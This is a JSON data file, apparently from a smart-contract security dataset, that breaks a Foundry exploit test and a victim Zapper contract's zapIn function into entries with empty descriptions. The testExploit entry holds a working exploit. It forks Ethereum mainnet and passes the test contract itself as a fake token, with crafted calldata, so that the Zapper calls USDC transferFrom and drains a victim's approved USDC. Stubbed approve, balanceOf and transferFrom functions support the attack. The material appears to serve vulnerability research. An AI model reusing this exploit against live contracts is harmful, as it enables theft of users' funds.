[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) external returns (bool) {\n        FRAX.transfer(address(zappper), 10);\n        return true;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(\n        address account\n    ) external view returns (uint256) {\n        return 1;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 15_933_794);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        address(WETH).call{value: 1e15}(\"\");\n        WETHToFRAX();\n        uint256 balance = USDC.balanceOf(victimAddress);\n        uint256 allowance = USDC.allowance(victimAddress, address(zappper));\n        uint256 amount = balance;\n        if (balance > allowance) {\n            amount = allowance;\n        }\n        bytes memory data =\n            abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", victimAddress, address(this), amount);\n        Zapper.ZapData memory zapData = Zapper.ZapData({\n            requiredToken: address(this),\n            amountIn: 1,\n            minAmountOut: 0,\n            allowanceTarget: address(this),\n            swapTarget: address(USDC),\n            callData: data\n        });\n        zappper.zapIn(zapData);\n\n        emit log_named_decimal_uint(\"[End] Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), 6);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Zapper",
    "source_type": "victim_contract",
    "function_name": "zapIn",
    "original_code": "    function zapIn(ZapData calldata zapCall)\n        external\n        payable\n        nonReentrant\n        isRelevant\n    {\n        if (zapCall.requiredToken != nativeETH) {\n            IERC20(zapCall.requiredToken).transferFrom(\n                msg.sender,\n                address(this),\n                zapCall.amountIn\n            );\n        }\n        uint256 amountIn = zap(zapCall, true);\n\n        IERC20(wantToken()).approve(address(vault), amountIn);\n        uint256 sharesOut = vault.deposit(amountIn, msg.sender);\n\n        emit ZappedIn(\n            zapCall.requiredToken,\n            msg.sender,\n            zapCall.amountIn,\n            sharesOut\n        );\n    }\n\n",
    "description": ""
  }
]